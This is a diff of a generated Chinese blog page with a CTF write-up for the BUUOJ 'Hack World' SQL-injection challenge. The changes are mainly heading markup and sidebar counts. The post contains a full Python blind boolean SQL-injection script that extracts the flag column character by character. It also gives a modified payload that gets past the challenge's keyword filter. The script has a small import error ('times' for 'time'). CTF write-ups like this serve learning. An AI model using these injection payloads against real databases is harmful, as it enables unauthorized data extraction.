@@ -204,9 +204,9 @@
             <div itemprop="articleBody"><p>续接上文</p>
 <span id="more"></span>
 
-<h2 id="打开靶机"><a href="#打开靶机" class="headerlink" title="打开靶机"></a>打开靶机</h2><p>同样是sql注入，题面已经提示我们flag在flag表的flag列里了</p>
+<h2><span id="打开靶机">打开靶机</span></h2><p>同样是sql注入，题面已经提示我们flag在flag表的flag列里了</p>
 <p>接下来我们只需要查询就好了</p>
-<h2 id="检测注入方式"><a href="#检测注入方式" class="headerlink" title="检测注入方式"></a>检测注入方式</h2><p>输入1’ 回显bool(false)</p>
+<h2><span id="检测注入方式">检测注入方式</span></h2><p>输入1’ 回显bool(false)</p>
 <p>没有报错信息</p>
 <p>使用堆叠注入和联合查询 均回显SQL Injection Checked.</p>
 <img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/1.png" class title="被过滤">
@@ -224,16 +224,16 @@
 
 <p>直接跑脚本就行了</p>
 <p>把昨天的脚本复制一下，post传参名称改为id就好了（题目提示要我们提供id）</p>
-<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> times</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;1^(ascii(substr((select(group_concat(flag))from(flag)),%d,1))&lt;%d)&quot;</span>%(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res +=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br></pre></td></tr></table></figure>
+<h2><span id="payload">Payload</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> times</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;1^(ascii(substr((select(group_concat(flag))from(flag)),%d,1))&lt;%d)&quot;</span>%(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res +=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br></pre></td></tr></table></figure>
 
 <p>但是这里跑是跑不出结果的</p>
-<h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>测试语句</p>
+<h3><span id="问题分析">问题分析</span></h3><p>测试语句</p>
 <p><code>1^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&lt;104)</code> (因为flag的第一个字母f的ascii是102)</p>
 <p>发现SQL Injection Checked</p>
 <p>所以说某些词被检测到了</p>
 <p>经测试..</p>
 <p>当输入<code>select(group_concat(flag))</code>时，检测到了SQL注入</p>
-<h3 id="修改Payload"><a href="#修改Payload" class="headerlink" title="修改Payload"></a>修改Payload</h3><p><strong>对于单个词汇，可以去掉group_concat</strong></p>
+<h3><span id="修改payload">修改Payload</span></h3><p><strong>对于单个词汇，可以去掉group_concat</strong></p>
 <p>所以脚本payload改为</p>
 <p><code>1^(ascii(substr((select(flag)from(flag)),%d,1))&lt;%d)%(i,mid)</code></p>
 <p>成功拿到flag</p>
@@ -448,7 +448,7 @@
                 文章
             </span>
             <span class="count">
-                4
+                5
             </span>
         </a>
         <a class="meta-item" href="/categories/">
@@ -464,7 +464,7 @@
                 标签
             </span>
             <span class="count">
-                4
+                6
             </span>
         </a>
     </div>
@@ -475,7 +475,7 @@
                 
   <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
     <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li></ul>
   </aside>
 
 
@@ -484,7 +484,7 @@
   <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
     <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
       <div class="tag-clouds">
-        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.8em;">POST</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a>
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.8em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.6em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.7em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a>
       </div>
   </aside>
 
@@ -495,6 +495,12 @@
   <div class="tab-content">
       <ul class="list-group">
         
+        
+          
+          
+            <a class="list-group-item" href="/2022/11/13/Destog3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/"><i class="fa  fa-book"></i> Dest0g3 520 迎新赛部分write up</a>
+            
+          
         
           
           
